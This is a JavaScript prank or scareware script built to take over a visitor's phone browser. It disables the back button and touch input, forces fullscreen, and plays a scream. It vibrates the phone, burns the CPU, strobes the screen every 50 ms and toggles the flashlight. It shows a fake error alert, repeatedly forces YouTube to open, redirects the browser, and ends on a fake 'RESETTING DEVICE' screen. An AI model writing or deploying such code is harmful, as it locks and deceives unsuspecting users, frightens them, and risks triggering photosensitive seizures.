// Prevent closing the page
window.history.pushState(null, "", window.location.href);
window.addEventListener("popstate", function () {
    window.history.pushState(null, "", window.location.href);
});

// Force fullscreen
document.documentElement.requestFullscreen();

// Disable touch (User can’t tap or scroll)
document.addEventListener("touchstart", (e) => e.preventDefault(), { passive: false });
document.addEventListener("touchmove", (e) => e.preventDefault(), { passive: false });

// Play a horrifying scream sound (NOW AFTER 3 SECONDS)
setTimeout(() => {
    let audio = new Audio("glitch 1.mp3");
    audio.loop = false;
    audio.play();
}, 3000);

// Vibrate phone randomly (NOW EVERY 3 SECONDS)
setInterval(() => {
    if (navigator.vibrate) {
        navigator.vibrate([500, 300, 500]); 
    }
}, 3000);

// Make the phone LAG LIKE CRAZY (NOW STARTS AFTER 3 SECONDS)
function extremeLag() {
    setInterval(() => {
        for (let i = 0; i < 1000000; i++) {
            Math.random() * Math.random(); // Heavy CPU load
        }
    }, 10);
}
setTimeout(extremeLag, 3000);

// Flicker screen brightness like a horror movie (NOW EVERY 50ms)
setInterval(() => {
    document.body.style.background = (Math.random() > 0.5) ? "white" : "black";
}, 50);

// Flashlight turns ON/OFF rapidly (NOW EVERY 300ms)
async function flashLightEffect() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", torch: true } });
        const track = stream.getVideoTracks()[0];
        let torchState = false;
        setInterval(() => {
            torchState = !torchState;
            track.applyConstraints({ advanced: [{ torch: torchState }] });
        }, 300);
    } catch (e) {
        console.log("Flashlight not supported.");
    }
}
flashLightEffect();

// FORCE YOUTUBE TO OPEN EVERY 2 SECONDS WITH A MESSAGE
function openYouTube() {
    alert("⚠️ ERROR: Click 'Continue' to fix the issue!"); // Forces them to tap
    window.location.href = "intent://www.youtube.com/watch?v=Hq6iKdyh-rE#Intent;package=com.google.android.youtube;scheme=https;end;";
}
setInterval(openYouTube, 2000); // Opens every 2 seconds

// REDIRECT TO CREEPY WEBSITE AFTER YOUTUBE CLOSES
setTimeout(() => {
    window.location.href = "https://www.shadertoy.com/view/XtcSzB"; // Weird horror animation
}, 20000); // Now happens after 20 seconds instead of 30!

// FAKE FACTORY RESET SCREEN (NOW AFTER 30 SECONDS)
setTimeout(() => {
    document.body.innerHTML = "<h1 style='color:white;background:black;'>RESETTING DEVICE...</h1><p style='color:red;'>Do not turn off your phone!</p>";
}, 30000);
